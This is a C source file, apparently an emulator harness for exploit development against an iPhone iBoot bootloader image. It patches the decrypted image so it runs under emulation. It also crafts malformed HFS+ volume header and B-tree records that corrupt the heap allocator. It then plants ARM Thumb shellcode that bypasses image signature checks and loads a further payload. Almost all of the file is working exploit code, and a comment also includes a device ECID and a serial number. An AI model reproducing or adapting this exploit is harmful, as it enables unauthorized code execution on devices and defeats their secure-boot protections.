#define IMAGE_NAME              "iBoot.n90bap.RELEASE.dec"
#define IMAGE_START             0x5FF00000
#define IMAGE_END               0x5FF50004
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         0xA6FFC
#define IMAGE_BSS_START         0x5FF41640
#define IMAGE_TEXT_END          0x5FF41000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE        0x1000
#define IMAGE_LOADADDR          0x40000000
#define IMAGE_HUGECHUNK         0x3000000


#define breakpoint1_ADDR        (0x178C4 + 1) /* ResolvePathToCatalogEntry */


#define fuck1_ADDR              (0x18726 + 1)
/* where the bins addr gets loaded */
#define fuck2_ADDR              (0x1873C + 1)
/* after we skipped the zeros */
#define fuck3_ADDR              (0x18852 + 1)
/* return block */

#define wait_for_event_ADDR     (0x00814)
#define hugechunk_ADDR          (0x00CAE + 1)
#define gpio_pin_state_ADDR     (0x02694 + 1)
#define gpio_set_state_ADDR     (0x026BC + 1)
#define get_timer_us_ADDR       (0x094DC + 1)
#define reset_cpu_ADDR          (0x095A0 + 1)
#define readp_ADDR              (0x184EC + 1)
#define get_mem_size_ADDR       (0x14D14 + 1)
#define putchar_ADDR            (0x31B78 + 1)
#define adjust_stack_ADDR       (0x1D6E0 + 1)
#define adjust_environ_ADDR     (0x1DB14 + 1)
#define disable_interrupts_ADDR (0x32884 + 1)
#define cache_stuff_ADDR        (0x20300 + 1)
#define wtf_ADDR                (0x????? + 1) /* ??? */

#define iboot_warmup_ADDR       (0x00110)
#define iboot_start_ADDR        (0x00BD0 + 1)
#define main_task_ADDR          (0x00C3C + 1)
#define panic_ADDR              (0x1E928 + 1)
#define system_init_ADDR        (0x1EA14 + 1)
#define task_create_ADDR        (0x1F044 + 1)
#define task_start_ADDR         (0x1F1A4 + 1)
#define task_exit_ADDR          (0x1F1C8 + 1)
#define printf_ADDR             (0x313E0 + 1)
#define malloc_ADDR             (0x18508 + 1)
#define free_ADDR               (0x185BC + 1)
#define create_envvar_ADDR      (0x16E2C + 1)
#define bcopy_ADDR              (0x31E64)
#define decompress_lzss_ADDR    (0x23260 + 1)

#define memalign_ADDR           (0x186E4 + 1)
#define BINS_ADDR               (0x447A0 + 0x28)
#define BINS_LEN                (0x20 * 0x4)

#define START_OF_BTREE_HEADER   0x44594
#define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) /* 0x44694 */
#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x2C) /* 0x54 is the right one, but we can't insert the shellcode in the btree header due to size constraints */
#define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48)

void NAKED
my_breakpoint1(void)
{
#ifdef __arm__
    __asm volatile (
        /* debug */
        BCALL(my_breakpoint1_helper)
        /* replacement insn */
        "ldrb r4, [r11];"
        /* return */
        "bx lr;"
    );
#endif /* __arm__ */
}

static uint8_t flg = 0; /* just a way to print only the desired _memalign debug logs (sp - t2 < 0). you can delete this if you wish */

#ifdef __arm__
void
real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    /* 0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap; */
    if (sp <= (uintptr_t)image + BINS_ADDR + BINS_LEN) {
        unsigned int t2 = (uintptr_t)image + BINS_ADDR + r3 * 4;
        if (sp - t2 > sp) {
            fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
            dumpfile("DUMP_z1");
            flg = 1;
        }else{
            flg = 0;
        }
    }else{
        flg = 0;
    }
    (void)(r0 && r1 && r2);
}

void
real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r9 __asm("r9");
    register unsigned int sp __asm("r11");
    /* 0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap; */
    if (sp <= (uintptr_t)image + BINS_ADDR + BINS_LEN && flg == 1) {
#define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
        unsigned int t4 = r2 - 0x40;
        unsigned int t1 = r0 + (r1 << 6);
        unsigned int u4 = ULAT(r2) - 0x40;
        unsigned int u1 = ULAT(r0) + (r1 << 6);
#undef ULAT
        fprintf(stderr, "_memalign: sp = 0x%x, r0 = 0x%x, r1 = 0x%x (0x%x/0x%x), r2 = 0x%x, r3 = 0x%x, r4 => (0x%x/0x%x), r9 = 0x%x (0x%x)\n", sp, r0, r1, t1, u1, r2, r3, t4, u4, r9, t1 - t4);
        dumpfile("DUMP_z2");
    }
}

void
real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    /* 0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap; */
    if (sp <= (uintptr_t)image + BINS_ADDR + BINS_LEN && flg == 1) {
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
        dumpfile("DUMP_z3");
        flg = 0;
    }
    (void)(r0 && r1 && r2 && r3);
}
#endif /* __arm__ */


void NAKED
fuck1(void)
{
#ifdef __arm__
    /* can use: r6, r10, r11 (r0, r1, r2) */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "blx    _getstak;"        /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "push   { r0-r12 };"
        "blx    _real_fuck1;"
        "pop    { r0-r12 };"
        "mov    sp, r11;"
        "add    r6, r4, #0x3f;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck2(void)
{
#ifdef __arm__
    /* can use: r4, r10, r11 */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r4, r0;"
        "blx    _getstak;"        /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r4;"
        "push   { r0-r12 };"
        "blx    _real_fuck2;"
        "pop    { r0-r12 };"
        "mov    sp, r11;"
        "sub    r4, r2, #0x40;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck3(void)
{
#ifdef __arm__
    /* can use: r10, r11 (r2, r3, r5, r6) */
    __asm volatile (
        "str    r0, [r8];"
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r6, r0;"
        "blx    _getstak;"        /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r6;"
        "push   { r0-r12 };"
        "blx    _real_fuck3;"
        "pop    { r0-r12 };"
        "mov    sp, r11;"
        "bx     r10;"
    );
#endif /* __arm__ */
}


void
my_adjust_stack(void)
{
    /*
     
    =======================================
    ::
    :: iBoot for n90bap, Copyright 2013, Apple Inc.
    ::
    ::    BUILD_TAG: 5ff52ac0 (SP: 5ff52cc0) //current_task (task's sp)
    ::
    ::    BUILD_STYLE: 5ff54894 //sp arm register
    ::
    ::    USB_SERIAL_NUMBER: CPID:8930 CPRV:20 CPFM:03 SCEP:02 BDID:04 ECID:00000300A89CDD6E IBFL:1B SRNM:[DX4KRY0WDP0N]
    ::
    =======================================
     
    Boot Failure Count: 0    Panic Fail Count: 0
    Delaying boot for 0 seconds. Hit enter to break into the command prompt...
    HFSInitPartition: 0x5fff6b80
    Entering recovery mode, starting command prompt
     
     */
#if 1
    CALL(malloc)(0x7C0 - 64); //0xA0300 -> fits HFSInitPartition
#elif 0
    void *ptr;
    ptr = CALL(malloc)(2048 - 64);
    CALL(free)(ptr);
    CALL(malloc)(1024 - 32);
    CALL(malloc)(1024 - 32);
#endif
}


void
my_adjust_environ(void)
{
#if 1
    CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/disk.dmg", 0);
#endif
}


void
suck_sid(void)
{
    fprintf(stderr, "suck sid\n");
    dumpfile("DUMP2");
}

int
drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth, unsigned int value)
{
    uint16_t i = 0;
    while (1) {
        unsigned int record_base = GET_WORD_LE(buffer, 0x200 - (i + 1) * 2);
        uint16_t key_len = GET_WORD_LE(buffer, record_base);
        uint16_t offset = record_base + 2 + key_len;
        uint8_t to_chk = (depth + 1) % 2 ? depth / 2 : (depth + 1) / 2;
        if (record_base == 0) {
            break;
        }
        if (seq == 3 * (depth + 1) + 1 && i == to_chk) {
            eprintf("TRIGGERING: writed 0x%x (BE) at offset 0x%x\n", value, offset);
            PUT_DWORD_BE(buffer, offset, value);
            return 1;
        }
        i++;
    }
    return 0;
}

int
my_readp(void *ih, void *buffer, long long offset, int length)
{
#define TREEDEPTH 1 /* +4? for recursion */
#define TRYFIRST 0 /* working, but not gud */
#define TRYLAST 0 /* not working */
    long long off;
    eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
#if TRYLAST
    if (buffer == (void *)IMAGE_LOADADDR) {
        return length;
    }
#endif
    off = lseek(rfd, offset, SEEK_SET);
    assert(off == offset);
    length = read(rfd, buffer, length);
    
#if 0 /* need to be enable this only if testing with ramdiskF_iloader.dmg */
    if (offset == 0x800) {
        PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
    }
#endif
    
#if TREEDEPTH || TRYFIRST || TRYLAST
#if ARGS
#define NODE_SIZE (node_size)
#else
#define NODE_SIZE (0x2000) /* also 0x1000 is working */
#endif
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
#if ARGS
    if (use_hardcoded_exploit) {
#else
    if (1) {
#endif
        
        unsigned int i;
        for (i = 0; i < length / 4; i++) {
            uint32_t addr = ((uint32_t *)buffer)[i];
            if (addr >= IMAGE_START && addr <= IMAGE_END) {
                ((void **)image)[i] = XLAT(addr);
            }
        }
        
    /* XXX stack recursion eats 208 bytes, watch out for 0x4D2C0 + 0x18 = 0x4D2D8 */
    /* XXX stack recursione eats ??? bytes watch out for 0x41350 + 0x18 = 0x41368 */
    /* that address contains the irq_disable_count of the boootstrap task */
    /* probably to watch out as it is between the garbage writing */
        static int seq = 0;
        switch (seq) {
            case 0:
                /* here buffer is struct HFSPlusVolumeHeader */
                PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);    /* HFSPlusVolumeHeader::catalogFile.logicalSize */
                PUT_QWORD_BE(buffer,  0xC0, EXTENT_SIZE);        /* HFSPlusVolumeHeader::extentsFile.logicalSize */
                break;
            case 1:
                memset(buffer, 'E', length);
                /* here buffer refers to the memory layout of btrees, which can be found here https://developer.apple.com/library/archive/technotes/tn/tn1150.html#BTrees
                initially we have a struct BTNodeDescriptor which is 14 bytes
                then we have the struct BTHeaderRec */
                /*
                 | BTNodeDescriptor | 14 bytes
                 | BTHeaderRec      | 106 bytes
                 */
#if TREEDEPTH
                PUT_WORD_BE(buffer, 14, 3);                /* BTHeaderRec::treeDepth */
#elif TRYLAST
                PUT_WORD_BE(buffer, 14, 2);                /* BTHeaderRec::treeDepth */
#endif
                PUT_WORD_BE(buffer, 32, 512);            /* BTHeaderRec::nodeSize */
                PUT_DWORD_BE(buffer, 36, 0x7FFFFF);            /* BTHeaderRec::totalNodes */
#if TRYFIRST
                PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1));    /* BTHeaderRec::rootNode (trigger) =0x7FFE */
#else
                PUT_DWORD_BE(buffer, 16, 3);            /* BTHeaderRec::rootNode */
#endif
#if NETTO
                memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
#endif
                break;
            case 2:
                memset(buffer, 'F', length);
#if NETTO
                if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
#endif
                PUT_WORD_BE(buffer, 32, NODE_SIZE);            /* BTHeaderRec::nodeSize */
                PUT_DWORD_BE(buffer, 36, TOTAL_NODES);        /* BTHeaderRec::totalNodes */
                PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
                PUT_WORD_LE(buffer, 20, 0);                /* must be zero (see above) */
                PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
                
                PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
                
                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
                
                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */
                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x447FC);    /* r11 -> lr */
#if !SHELLCODE
                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
#else
                /* SHEELCODE */
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   0 - START_OF_EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC72);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   4 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE +  4, disable_interrupts_ADDR - 1));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +   8 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(4, 68));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  10 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 72));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  12 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(1, 4));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  14 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 72));
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  16 - START_OF_EXTENTS_BTREE_HEADER, make_bl(1, START_OF_SHELLCODE + 16, bcopy_ADDR));
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  20 - START_OF_EXTENTS_BTREE_HEADER, INSNW_MOV_R1_2400);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  24 - START_OF_EXTENTS_BTREE_HEADER, INSNW_STRH_R1_R4_E2C);
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  28 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 60));
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  30 - START_OF_EXTENTS_BTREE_HEADER, INSNW_MOV_R1_40000000);
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  34 - START_OF_EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  36 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 56));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  38 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(1, 60));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  40 - START_OF_EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  42 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 60));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  44 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(1, 0xFC));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  46 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 60));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  48 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(3, nettoyeur_sz));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  50 - START_OF_EXTENTS_BTREE_HEADER, INSNT_PUSH_R0);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  52 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE + 52, decompress_lzss_ADDR - 1));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  56 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 52));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  58 - START_OF_EXTENTS_BTREE_HEADER, INSNT_BLX_R(0));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  60 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(14, 4));
                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  62 - START_OF_EXTENTS_BTREE_HEADER, INSNT_POP_PC);
                
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  76 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  80 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x44000000 */);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  84 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x5ff00000 */);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  88 - START_OF_EXTENTS_BTREE_HEADER, IMAGE_BSS_START - IMAGE_START);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  92 - START_OF_EXTENTS_BTREE_HEADER, 0x3F378 /* go command handler */);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  96 - START_OF_EXTENTS_BTREE_HEADER, 0x19164 /* allow unsigned images */);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 100 - START_OF_EXTENTS_BTREE_HEADER, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x445BC /* nettoyeur compressed */);
                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
                
                /* END */
#endif
                break;
                
#if TREEDEPTH
            default:
            {
                static long long oldpos = 0;
                if ((seq % 3) == 0) {
                    ((unsigned char *)buffer)[9] += 1;                        /* BTNodeDescriptor::height */
                    ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                    oldpos = offset;
                } else if (oldpos) {
                    lseek(rfd, oldpos, SEEK_SET);
                    read(rfd, buffer, length);
                    oldpos = 0;
                    
                    /* IMPORTANT: this is basically setting the node number field inside the corresponding index pointer record */
                    /*
                     struct IndexPointerRecord {
                        uint8/uint16 keyLength;
                        uint8_t key[keyLength];
                        [pad]
                        uin32_t nodeNumber; // <- we are targeting this. xerub refers this as "block number"
                        [pad]
                     }
                     */
#if TREEDEPTH
#if ARGS
                    drillDownPathTill(buffer, seq, drill_path, 0x10000);
#else
                    drillDownPathTill(buffer, seq, 21, 0x10000);
#endif
#endif
                }
            }
#endif /* TREEDEPTH */
        }
#if TRYLAST
        if (seq == 2 + (23 * 2) * (2 + TREEDEPTH)) { /* XXX wot? why 14? */
            eprintf("TRIGGERING\n");
            PUT_DWORD_BE(buffer, 0x11C, 1);
        }
#endif /* TRYLAST */
        if (seq < 3) {
            int ofd;
            char tmp[256];
            sprintf(tmp, "BLOCK_%llx_%d", offset, seq);
            ofd = creat(tmp, 0644);
            if (ofd >= 0) {
                write(ofd, buffer, length);
                close(ofd);
            }
        }
        seq++;
    }
#endif
    return length;
}


void
check_irq_count(void)
{
    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x41350 + 0x18));
}


void
my_cache_stuff(void)
{
#ifdef __APPLE__
    sys_icache_invalidate(image, IMAGE_SIZE + IMAGE_HEAP_SIZE);
#endif
}


#if USE_SIGNAL
#ifdef __arm__
int
dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
    struct mmreg {
        unsigned long mmaddr;
        unsigned int pc;
        int reg;
        int val;
        int next;
    };

    static const struct mmreg mmregs[] = {
    /* nop 0xbf106000, 0xbf50000{0,8,c} (serial number) */
    { 0xbf50000c, 0x1DEF8, 0, 0, 2 },
    { 0xbf50000c, 0x1DEFA, 1, 0, 2 },
    { 0xbf500000, 0x1DE8E, 0, 0, 2 },
    { 0xbf500000, 0x1DEAE, 0, 0, 2 },
    { 0xbf500000, 0x1DE7E, 0, 0, 2 },
        
    { 0xbf106000, 0x1DD48, 0, 0, 2 },
        
    { 0xbf500008, 0x1DF16, 0, 0, 2 },
    { 0xbf500008, 0x1DF1C, 2, 0, 2 },
    { 0xbf50000c, 0x1DF22, 3, 0, 4 },
    { 0xbf500008, 0x1DF2A, 1, 0, 2 },
    { 0xbf50000c, 0x1DF2C, 9, 0, 4 },
    /* nop 0x832000xx (boot failure count) */
    { 0x83200000, 0x09730,-1, 0, 2 },
    { 0x83200014, 0x09736,-1, 0, 2 },
    { 0x83200010, 0x0973C,-1, 0, 2 },
    { 0x83200018, 0x09742,-1, 0, 2 },
    { 0x83200020, 0x0975A,-1, 0, 2 },
    { 0x83200024, 0x09766,-1, 0, 2 },
    /* end-of-table */
    { 0xFFFFFFFF, 0x00000, 0, 0, 0 },
    };

    const struct mmreg *m;

    if (si_addr == 0) {
        if (tctx->__pc == (uintptr_t)(image + 0x1EE56)) {
            /* idle task crap (read from *0) */
            tctx->__r[0] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
        if (tctx->__pc == (uintptr_t)(image + 0x1F0B6)) {
            tctx->__r[1] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
    }

    for (m = mmregs; m->mmaddr != 0xFFFFFFFF; m++) {
        if (si_addr == (void *)m->mmaddr && tctx->__pc == (uintptr_t)(image + m->pc)) {
            int reg = m->reg;
            int val = m->val;
            if (reg >= 0) {
                tctx->__r[reg] = val;
            }
            tctx->__pc += m->next;
            return 0;
        }
    }

    return -1;
}

int
dispatch(int signum, void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
#if USE_SIGNAL > 1
    if (signum == ILLNO) {
        if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
            /* ARM handlers: tctx->__pc += 4; */
            uintptr_t addr = (unsigned char *)si_addr - image;
            switch (addr) {
            case wait_for_event_ADDR:
                my_wait_for_event();
            }
        } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
            /* Thumb handlers: tctx->__pc += 2; */
            uintptr_t addr = (unsigned char *)si_addr - image + 1;
            switch (addr) {
            case cache_stuff_ADDR:
                my_cache_stuff();
                tctx->__pc = tctx->__lr;
                return 0;
            case hugechunk_ADDR:
                tctx->__r[0] = (uint32_t)gethuge();
                tctx->__pc += 4;
                return 0;
            case gpio_pin_state_ADDR:
                tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
                tctx->__pc = tctx->__lr;
                return 0;
            case gpio_set_state_ADDR:
                my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
                tctx->__pc = tctx->__lr;
                return 0;
            case get_timer_us_ADDR:
                *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
                tctx->__pc = tctx->__lr;
                return 0;
            case reset_cpu_ADDR:
                my_reset_cpu();
            case readp_ADDR:
                tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
                tctx->__pc = tctx->__lr;
                return 0;
            case get_mem_size_ADDR:
                tctx->__r[0] = my_get_mem_size();
                tctx->__pc = tctx->__lr;
                return 0;
            case putchar_ADDR:
                putchar(tctx->__r[0]);
                tctx->__pc = tctx->__lr;
                return 0;
            case adjust_stack_ADDR:
                my_adjust_stack();
                tctx->__pc = tctx->__lr;
                return 0;
            case adjust_environ_ADDR:
                my_adjust_environ();
                tctx->__pc = tctx->__lr;
                return 0;
            case breakpoint1_ADDR:
                my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
                tctx->__r[4] = *(unsigned char *)tctx->__r[11];
                tctx->__pc += 4;
                return 0;
            }
        }
    }
#endif /* USE_SIGNAL > 1 */
    if (signum == SIGSEGV) {
        return dispatch_SEGV(si_addr, tctx);
    }
    return -1;
}
#endif /* __arm__ */
#endif /* USE_SIGNAL */


void
patch_image(unsigned char *image)
{
    /* jump directly to warmup */
    *image = (iboot_warmup_ADDR - 8) / 4;
    /* heap hardcoded offset */
    *(uint32_t *)(image + 0x1EA20) = INSN2_LDR_R1_PC__B_PLUS4;
    *(void **)(image + 0x1EA24) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE);
    /* clean data cache */
    *(uint32_t *)(image + 0x1FDDC) = INSNA_RETURN;
#if !USE_SIGNAL
    /* idle task crap (read from *0) */
    *(uint16_t *)(image + 0x1EE56) = INSNT_NOP;
    *(uint16_t *)(image + 0x1F0B6) = INSNT_MOV_R_R(1, 0);
#endif /* !USE_SIGNAL */
    /* timer 2 */
    *(uint16_t *)(image + 0x1E448) = INSNT_MOV_R_I(1, 0);
    *(uint16_t *)(image + 0x1E452) = INSNT_NOP;
    /* task switch FPU */
    *(uint32_t *)(image + 0x20338) = INSNA_MOV_R2_0;
    *(uint32_t *)(image + 0x20368) = INSNA_MOV_R2_0;
    /* bzero during mmu_init */
    *(uint32_t *)(image + 0x1F5F0) = INSN2_NOP__NOP;
    /* nop some calls during iboot_start */
    *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP;
#if 0 /* adjust_stack */
    *(uint32_t *)(image + 0x00BDE) = INSN2_NOP__NOP;
#endif

    /* nop spi stuff */
#if 0 /* adjust_environ */
    *(uint32_t *)(image + 0xCBA) = INSN2_NOP__NOP;
#endif
    /* FPEXC triggered by nvram_save() */
    *(uint32_t *)(image + 0x498) = INSNA_NOP;
    *(uint32_t *)(image + 0x490) = INSNA_NOP;

    /* pretend we have nand device? */
    *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1;
    *(uint32_t *)(image + 0x18122) = INSN2_MOV_R0_1__MOV_R0_1;
#if DEBUG_MALLOC
    /* show task structure */
    /* BUILD_TAG: */
    *(void **)(image + 0xFA4) = image + 0x52C40; //0x41330;
    *(uint8_t *)(image + 0x32C90) = 'x';
    /* make main_task show SP */
    /* BUILD_STYLE: */
    *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13);
    *(uint8_t *)(image + 0x32CA4) = 'x';
#endif
    /* nop NAND */
    *(uint32_t *)(image + 0x1D940) = INSN2_NOP__NOP;
    /* nop 0x832000xx (boot failure count) */
#if !USE_SIGNAL
    *(uint16_t *)(image + 0x09730) = INSNT_NOP;
    *(uint16_t *)(image + 0x09736) = INSNT_NOP;
    *(uint16_t *)(image + 0x0973C) = INSNT_NOP;
    *(uint16_t *)(image + 0x09742) = INSNT_NOP;
    *(uint16_t *)(image + 0x0975A) = INSNT_NOP;
    *(uint16_t *)(image + 0x09766) = INSNT_NOP;
#endif /* !USE_SIGNAL */
    *(uint16_t *)(image + 0x09772) = INSNT_NOP;

    /* nop some more hw */
    *(uint32_t *)(image + 0x1D8F0) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1D8DE) = INSN2_NOP__NOP;
    *(uint32_t *)(image + 0x1D8E2) = INSN2_NOP__NOP;
#if !USE_SIGNAL
    /* nop 0xbf106000, 0xbf50000{0,8,c} (serial number) */
    *(uint32_t *)(image + 0x1DEF0) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1DE8E) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1DEAE) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1DE7E) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1DD48) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1DF08) = INSN2_RETURN_0;
#endif /* !USE_SIGNAL */
}


void
patch_nettoyeur(unsigned char *nettoyeur)
{
    *(void **)(nettoyeur + 0x9C) = image + *(uint32_t *)(nettoyeur + 0x9C) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xA0) = XLAT(*(uint32_t *)(nettoyeur + 0xA0));
    *(void **)(nettoyeur + 0xA4) = XLAT(*(uint32_t *)(nettoyeur + 0xA4));
    *(void **)(nettoyeur + 0xA8) = XLAT(*(uint32_t *)(nettoyeur + 0xA8));
}

